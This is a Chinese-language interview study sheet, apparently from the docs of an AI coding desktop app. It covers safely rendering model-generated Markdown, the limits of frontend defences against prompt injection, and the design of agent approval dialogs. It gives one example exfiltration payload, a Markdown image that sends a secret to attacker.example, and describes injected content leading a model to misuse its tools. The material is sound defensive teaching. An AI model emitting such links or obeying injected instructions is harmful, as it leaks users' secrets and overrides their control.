# 六、AI 特性与前端工程实践 · 下

> 题单，对着说。每题顺序固定：这题在考什么 → 一句话回答 → 展开说明 → 示例 → Moose 里的做法 → 容易答错的地方。承接 [上篇](06-ai-features-1.md)。对应 [答案](../06-ai-features.md) 第 10、11 题。事实按 Moose 0.23.3。答题稿里写了「没有」的，不要说成已经做了。

## 10. 模型输出的 Markdown 和链接怎样安全渲染？前端能防住提示词注入吗？

> **这题在考什么**：聊天界面几乎都会把模型回答渲染成 Markdown。可模型的输出可能受它读过的网页、文件或工具结果操纵，里面混进一段 HTML、一个 `javascript:` 链接或一张图片，就可能在用户的浏览器里执行脚本或把数据带走。面试官想看你是否把模型输出当成不可信内容，并分清前端能防什么、不能防什么。

**一句话回答**：把模型输出当作不可信的用户输入来渲染：不渲染原始 HTML（或经过白名单清洗），链接只放行 `http(s)` 等少数协议，外部图片不自动加载，代码块只展示不执行；提示词注入的根源在模型读到的内容里，前端只能减少损失，真正的防线是工具最小权限、危险操作人工审批和隔离密钥。

**展开说明**
- 原始 HTML：要么直接跳过，要么用 DOMPurify、rehype-sanitize 这类白名单清洗器处理后再渲染，不要把模型输出塞进 `innerHTML`。
- 链接：只允许 `https:`、`http:` 等明确的协议，`javascript:`、`data:` 一律丢弃；外链要在新窗口或系统浏览器打开，不要在应用窗口内跳转。
- 图片和链接也是泄露数据的通道。被注入的指令可能让模型输出 `![](https://attacker.example/x.png?d=密钥)`，浏览器一自动加载图片，数据就随 URL 发出去了。所以外部图片最好改成点击才打开，或者用 CSP 限制图片来源。
- 代码块只做高亮和复制，绝不自动执行；“运行”按钮也要走正常的审批流程。
- 提示词注入（模型把读到的内容误当成指令）来自网页、文件、工具结果等外部材料。前端清洗只能挡住渲染层面的攻击，挡不住模型被骗去调用工具。

| 风险 | 前端能做的 | 必须在别处做的 |
| --- | --- | --- |
| 原始 HTML、脚本 | 跳过或清洗 HTML、配置 CSP | — |
| 恶意链接、图片外传 | 协议白名单、外部图片不自动加载 | — |
| 模型被骗去调用工具 | 显示审批详情 | 工具最小权限、后端校验、人工审批 |
| 密钥泄露 | 界面里不展示密钥 | 密钥不放进模型能读到的上下文 |

**示例**：下面用 `react-markdown` 跳过原始 HTML，并只放行 `http(s)` 和相对链接（示意）。

```tsx
<ReactMarkdown
  skipHtml // 不渲染模型输出里的原始 HTML
  urlTransform={(url) =>
    /^https?:/i.test(url) || !/^\w[\w+.-]*:/.test(url) ? url : '' // 其他协议一律清空
  }
>
  {text}
</ReactMarkdown>
```

**Moose 里的做法**：`src/components/markdown.tsx` 用 `react-markdown` 加 `remark-gfm`、`rehype-highlight` 渲染消息，开启了 `skipHtml`，`urlTransform` 只保留 `http(s)`、`file:` 和不带协议的相对路径。链接被改写成点击事件：`http(s)` 链接通过 `openExternal` 交给系统浏览器打开，其余当作本地文件在应用内预览；外部图片不会自动加载，只显示成一个点击才打开的链接。代码块只提供换行和复制按钮。`shared/validation.ts` 里 `openExternal` 的参数校验只允许 `http:`、`https:`。`electron/main.ts` 的窗口开启了 `sandbox`、`contextIsolation`，关闭了 `nodeIntegration`；`setWindowOpenHandler` 一律拒绝新窗口，`will-navigate` 和 `will-redirect` 阻止跳离当前页面，并注入 CSP（`img-src 'self' data:`、`object-src 'none'` 等）。Web 版的 CSP 在 `electron/web-server.ts` 里设置。这些措施管的是渲染层，代理会不会被注入内容骗去执行命令，要靠下一题的审批和底座的沙箱。

**容易答错的地方**
- 以为用了 Markdown 库就安全。很多库有允许原始 HTML 的选项，链接协议也要自己限制。
- 以为前端清洗能“解决”提示词注入。它只能防止渲染层被利用，模型被骗之后能做什么，取决于它手里工具的权限。

## 11. Agent 要执行危险操作（改文件、跑命令、联网）前，审批界面该怎么设计？

> **这题在考什么**：Agent 能改文件、跑命令，一次误批就可能删掉代码或泄露数据。审批界面要让用户看清“到底要做什么”，更要保证用户批准的正是那一个操作，而不是后来冒出来的另一个。面试官想看你对展示内容、授权范围和后端校验的整体设计。

**一句话回答**：审批卡要展示确切的命令、工作目录、文件改动和权限范围，提供“仅此一次 / 本会话内允许 / 拒绝”等选项；每个审批绑定到具体的请求 ID 和任务 ID，由后端重新校验仍然有效才放行；同时用沙箱限定默认能做的事，把“明确拒绝”和“结果未知”分开处理。

**展开说明**
- 展示命令、工作目录、diff 和额外权限，不要只问“是否允许执行工具？”。授权默认“仅此一次”；“本会话内允许”范围更大，拒绝最好能附原因。这是通用设计，Moose 有没有做到见下面。
- 审批带上请求 ID 和任务 ID。后端确认请求仍在等待、任务还在跑、选项仍合法。旧页面上的批准不能作用到后来的另一个操作。
- 等待太久或任务已结束时标成已过期，不要默认批准或默认拒绝。用户拒绝是确定没执行；连接断了是结果未知，不能自动重试。
- 沙箱（限制进程能访问的文件和网络的运行环境）决定哪些操作根本不需要问。超出工作区或要联网，才弹审批。

| 档位 | 默认能做什么 | 何时弹审批 |
| --- | --- | --- |
| 只读 | 读文件 | 任何写入或命令 |
| 工作区写入 | 改工作区内文件、跑受限命令 | 越出工作区、联网、提权 |
| 完全访问 | 几乎不受限 | 不弹，用户自担风险 |

**示例**：下面是后端处理审批回复时的校验顺序（伪代码）。

```ts
const pending = pendingRequests.get(requestId);  // 只认仍在等待的请求
if (!pending || pending.runId !== activeRunId) throw new Error('请求已失效');
if (!pending.options.has(choice)) throw new Error('无效的选项'); // 只接受当初给出的选项
agent.reply(pending.rpcId, choice);              // 用原始请求 ID 回给代理
pendingRequests.delete(requestId);               // 用过即删，不能重复批准
```

**Moose 里的做法**：
- 审批由代理 CLI 发起。以 Codex 为例，`electron/providers/codex.ts` 收到 `item/commandExecution/requestApproval`、`item/fileChange/requestApproval` 或 `item/permissions/requestApproval` 这类 JSON-RPC 请求后，记下原始请求 ID 和可选项，生成一条 `kind: 'approval'`、状态为 `pending` 的消息，标题是命令，正文是理由和改动或权限内容，选项为“Allow once”和“Deny”。
- 消息 ID 由任务 ID 和请求键拼成（`electron/session-execution.ts`）。用户回复走 `respond` 请求，`electron/service.ts` 先确认对应任务仍在运行、消息仍是 `pending`、任务没有被取消，否则返回“This request is no longer active”；适配器再核对选项是否属于当初给出的那几个，用原始请求 ID 回给 CLI，然后删除这条待处理请求。
- 任务结束、失败或被取消时，仍在等待的审批会被标成 `expired`，不会被当作批准或拒绝。Grok 适配器在取消和关闭时会把未决的权限请求回复为 `cancelled`。
- Plan 模式和原生代码审查期间，Codex 的命令和文件改动审批会被自动拒绝。
- 权限档位：`electron/providers/codex-permissions.ts` 把“请求批准”映射为 `on-request` 加 `workspace-write` 沙箱，并关闭沙箱网络和网页搜索；“帮我批准”改由 Codex 的 `auto_review` 审核；“完全访问”对应 `never` 加 `danger-full-access`。0.23.3 起四家都有这三档。Pi 仍没有可暂停的工具协议：请求批准会中止改动，帮我批准和完全访问允许同一组工具。OpenCode 由 Moose 在权限回调里交给用户、选一次性允许或选始终允许。见[计划、目标与三档权限](../../reference/08-plan-goal-permissions.md)。
- Moose 没有实现审批超时（任务结束前一直等待），也没有“拒绝并附原因”的输入框。Codex 的审批卡只提供“仅此一次”和“拒绝”，没有“本会话内允许”；Grok 的选项则直接使用代理给出的列表。

**容易答错的地方**
- 只在前端把按钮置灰，后端不校验请求是否仍有效。页面刷新或多端同时打开时，旧请求就可能被重复批准。
- 断线后把“没收到结果”当成“被拒绝”并自动重试，导致同一条命令执行两次。

---

上一篇：[六、Agent 与成本 · 上](06-ai-features-1.md) ｜ [题单目录](README.md) ｜ 下一篇：[七、工具链 · 上](07-toolchain-1.md)
